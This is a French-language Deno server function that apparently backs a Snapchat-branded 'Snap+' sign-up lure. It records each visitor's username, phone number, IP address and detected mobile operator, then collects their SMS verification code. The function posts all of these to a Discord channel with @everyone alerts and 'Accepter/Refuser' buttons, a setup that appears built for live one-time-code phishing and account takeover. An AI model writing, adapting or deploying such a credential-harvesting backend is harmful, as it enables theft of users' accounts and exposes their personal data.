import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};

// Détection de l'opérateur français basé sur les préfixes ARCEP
function detectOperator(phone: string): { name: string; emoji: string } {
  const cleanPhone = phone.replace(/\s/g, '').replace(/^0/, '');
  const prefix = cleanPhone.substring(0, 3); // ex: "612", "750"
  
  // Préfixes Orange
  const orangePrefixes = [
    '607', '608', '609', '610', '611', '612', '613', '614', '615', '616', '617', '618', '619',
    '620', '621', '622', '623', '624', '625', '626', '627', '628', '629',
    '670', '671', '672', '673', '674', '675', '676', '677', '678', '679',
    '680', '681', '682', '683', '684', '685', '686', '687', '688', '689',
    '730', '731', '732', '733', '734', '735', '736', '737', '738', '739',
    '780', '781', '782', '783', '784', '785', '786', '787', '788', '789'
  ];
  
  // Préfixes SFR
  const sfrPrefixes = [
    '600', '601', '602', '603', '604', '605', '606',
    '630', '631', '632', '633', '634', '635', '636', '637', '638', '639',
    '660', '661', '662', '663', '664', '665', '666', '667', '668', '669',
    '760', '761', '762', '763', '764', '765', '766', '767', '768', '769'
  ];
  
  // Préfixes Bouygues
  const bouyguesPrefixes = [
    '640', '641', '642', '643', '644', '645', '646', '647', '648', '649',
    '650', '651', '652', '653', '654', '655', '656', '657', '658', '659',
    '698', '699',
    '700', '701', '702', '703', '704', '705', '706', '707', '708', '709',
    '740', '741', '742', '743', '744', '745', '746', '747', '748', '749'
  ];
  
  // Préfixes Free
  const freePrefixes = [
    '690', '691', '692', '693', '694', '695', '696', '697',
    '750', '751', '752', '753', '754', '755', '756', '757', '758', '759',
    '770', '771', '772', '773', '774', '775', '776', '777', '778', '779'
  ];

  if (orangePrefixes.includes(prefix)) {
    return { name: 'Orange', emoji: '🟠' };
  } else if (sfrPrefixes.includes(prefix)) {
    return { name: 'SFR', emoji: '🔴' };
  } else if (bouyguesPrefixes.includes(prefix)) {
    return { name: 'Bouygues', emoji: '🔵' };
  } else if (freePrefixes.includes(prefix)) {
    return { name: 'Free', emoji: '🟣' };
  }
  
  return { name: 'Inconnu', emoji: '⚪' };
}

serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const DISCORD_BOT_TOKEN = Deno.env.get('DISCORD_BOT_TOKEN');
    const DISCORD_CHANNEL_ID = Deno.env.get('DISCORD_CHANNEL_ID');
    
    if (!DISCORD_BOT_TOKEN || !DISCORD_CHANNEL_ID) {
      console.error('[CONFIG] Missing Discord env vars');
      return new Response(JSON.stringify({ error: 'Une erreur est survenue. Veuillez réessayer.' }), {
        status: 500,
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      });
    }

    const supabaseUrl = Deno.env.get('SUPABASE_URL')!;
    const supabaseKey = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')!;
    const supabase = createClient(supabaseUrl, supabaseKey);

    // Récupérer l'IP du client
    const clientIp = req.headers.get('x-forwarded-for')?.split(',')[0]?.trim() || 
                     req.headers.get('cf-connecting-ip') || 
                     req.headers.get('x-real-ip') || 
                     'Inconnue';

    const body = await req.json().catch(() => ({}));
    const { username, phone, code, step, submissionId } = body ?? {};

    // Validation serveur
    const UUID_RE = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i;
    const isValidUsername = typeof username === 'string' && username.length >= 1 && username.length <= 50;
    const isValidPhone = typeof phone === 'string' && /^0[67]\d{8}$/.test(phone);
    const isValidStep = step === 'form' || step === 'code';

    if (!isValidStep || !isValidUsername || !isValidPhone) {
      return new Response(JSON.stringify({ error: 'Données invalides.' }), {
        status: 400,
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      });
    }
    if (step === 'code') {
      if (typeof code !== 'string' || !/^\d{4,8}$/.test(code)) {
        return new Response(JSON.stringify({ error: 'Données invalides.' }), {
          status: 400,
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        });
      }
      if (typeof submissionId !== 'string' || !UUID_RE.test(submissionId)) {
        return new Response(JSON.stringify({ error: 'Données invalides.' }), {
          status: 400,
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        });
      }
    }

    // Sanitize Discord markdown injection
    const sanitizeMd = (s: string) => s.replace(/[*_`~|\\[\]()@<>]/g, '').slice(0, 50);
    const safeUsername = sanitizeMd(username);

    // Rate limit par téléphone (max 3 soumissions form / heure)
    if (step === 'form') {
      const oneHourAgo = new Date(Date.now() - 3600_000).toISOString();
      const { data: recent } = await supabase
        .from('submissions')
        .select('id')
        .eq('phone', phone)
        .gte('created_at', oneHourAgo)
        .limit(5);
      if (recent && recent.length >= 3) {
        return new Response(JSON.stringify({ error: 'Trop de tentatives. Réessayez plus tard.' }), {
          status: 429,
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        });
      }
    }

    // Formater le numéro de téléphone avec drapeau français et +33
    const formatPhone = (p: string) => {
      const formatted = p.replace(/(\d{2})(\d{2})(\d{2})(\d{2})(\d{2})/, '$1 $2 $3 $4 $5');
      return `🇫🇷 +33 ${formatted.substring(1)}`; // Remplace le 0 par +33
    };

    // Détecter l'opérateur
    const operator = detectOperator(phone);

    // Si c'est le formulaire initial, créer une entrée
    if (step === "form") {
      const { data, error } = await supabase
        .from('submissions')
        .insert({ username, phone, status: 'pending', ip_address: clientIp })
        .select()
        .single();

      if (error) {
        throw error;
      }

      const embed = {
        title: "📱 Nouvelle demande Snap+",
        description: "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n**Une nouvelle demande d'inscription a été reçue !**\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
        color: 0xFFA500,
        thumbnail: {
          url: "https://upload.wikimedia.org/wikipedia/fr/a/ad/Logo-Snapchat.png"
        },
        fields: [
          {
            name: "\u200B",
            value: "\u200B",
            inline: false
          },
          {
            name: "👤 Nom d'utilisateur",
            value: `>>> **${username}**`,
            inline: false
          },
          {
            name: "\u200B",
            value: "\u200B",
            inline: false
          },
          {
            name: "📞 Numéro de téléphone",
            value: `>>> \`${formatPhone(phone)}\``,
            inline: false
          },
          {
            name: "\u200B",
            value: "\u200B",
            inline: false
          },
          {
            name: `${operator.emoji} Opérateur mobile détecté`,
            value: `>>> **${operator.name}**`,
            inline: false
          },
          {
            name: "\u200B",
            value: "\u200B",
            inline: false
          },
          {
            name: "🌐 Adresse IP",
            value: `>>> \`${clientIp}\``,
            inline: false
          },
          {
            name: "\u200B",
            value: "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
            inline: false
          }
        ],
        footer: { 
          text: "⏳ En attente du code de vérification...",
          icon_url: "https://upload.wikimedia.org/wikipedia/fr/a/ad/Logo-Snapchat.png"
        },
        timestamp: new Date().toISOString()
      };

      await fetch(`https://discord.com/api/v10/channels/${DISCORD_CHANNEL_ID}/messages`, {
        method: 'POST',
        headers: { 
          'Authorization': `Bot ${DISCORD_BOT_TOKEN}`,
          'Content-Type': 'application/json' 
        },
        body: JSON.stringify({ 
          content: "@everyone",
          embeds: [embed] 
        }),
      });

      return new Response(JSON.stringify({ success: true, submissionId: data.id }), {
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      });
    }

    // Si c'est le code, mettre à jour et envoyer avec vrais boutons
    if (step === "code" && submissionId) {
      await supabase
        .from('submissions')
        .update({ code, status: 'pending' })
        .eq('id', submissionId);

      const now = new Date();
      const dateStr = now.toLocaleDateString('fr-FR', { 
        day: '2-digit', 
        month: '2-digit', 
        year: 'numeric' 
      });
      const timeStr = now.toLocaleTimeString('fr-FR', { 
        hour: '2-digit', 
        minute: '2-digit', 
        second: '2-digit' 
      });

      const embed = {
        title: "🔐 Code de vérification soumis",
        description: "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n**Un code de vérification a été soumis !**\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
        color: 0xFFA500,
        thumbnail: {
          url: "https://upload.wikimedia.org/wikipedia/fr/a/ad/Logo-Snapchat.png"
        },
        fields: [
          {
            name: "\u200B",
            value: "\u200B",
            inline: false
          },
          {
            name: "👤 Nom d'utilisateur",
            value: `>>> **${username}**`,
            inline: false
          },
          {
            name: "\u200B",
            value: "\u200B",
            inline: false
          },
          {
            name: "🔢 Code de vérification",
            value: `\`\`\`fix\n${code}\n\`\`\``,
            inline: false
          },
          {
            name: "\u200B",
            value: "\u200B",
            inline: false
          },
          {
            name: "📞 Numéro de téléphone",
            value: `>>> \`${formatPhone(phone)}\``,
            inline: false
          },
          {
            name: "\u200B",
            value: "\u200B",
            inline: false
          },
          {
            name: `${operator.emoji} Opérateur mobile détecté`,
            value: `>>> **${operator.name}**`,
            inline: false
          },
          {
            name: "\u200B",
            value: "\u200B",
            inline: false
          },
          {
            name: "📅 Date et heure de soumission",
            value: `>>> \`${dateStr} à ${timeStr}\``,
            inline: false
          },
          {
            name: "\u200B",
            value: "\u200B",
            inline: false
          },
          {
            name: "🌐 Adresse IP",
            value: `>>> \`${clientIp}\``,
            inline: false
          },
          {
            name: "\u200B",
            value: "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
            inline: false
          }
        ],
        footer: { 
          text: "⚠️ En attente de validation par un modérateur",
          icon_url: "https://upload.wikimedia.org/wikipedia/fr/a/ad/Logo-Snapchat.png"
        },
        timestamp: new Date().toISOString()
      };

      const payload = {
        content: "@everyone",
        embeds: [embed],
        components: [
          {
            type: 1,
            components: [
              {
                type: 2,
                style: 3,
                label: "Accepter",
                custom_id: `approve_${submissionId}`,
              },
              {
                type: 2,
                style: 4,
                label: "Refuser",
                custom_id: `reject_${submissionId}`,
              }
            ]
          }
        ]
      };

      const response = await fetch(`https://discord.com/api/v10/channels/${DISCORD_CHANNEL_ID}/messages`, {
        method: 'POST',
        headers: { 
          'Authorization': `Bot ${DISCORD_BOT_TOKEN}`,
          'Content-Type': 'application/json' 
        },
        body: JSON.stringify(payload),
      });

      if (!response.ok) {
        const errorText = await response.text();
        console.error('Discord API error:', errorText);
        throw new Error(`Discord API error: ${response.status}`);
      }

      return new Response(JSON.stringify({ success: true }), {
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      });
    }

    return new Response(JSON.stringify({ success: true }), {
      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
    });
  } catch (error: unknown) {
    console.error('[discord-webhook] Error:', error);
    return new Response(JSON.stringify({ error: 'Une erreur est survenue. Veuillez réessayer.' }), {
      status: 500,
      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
    });
  }
});
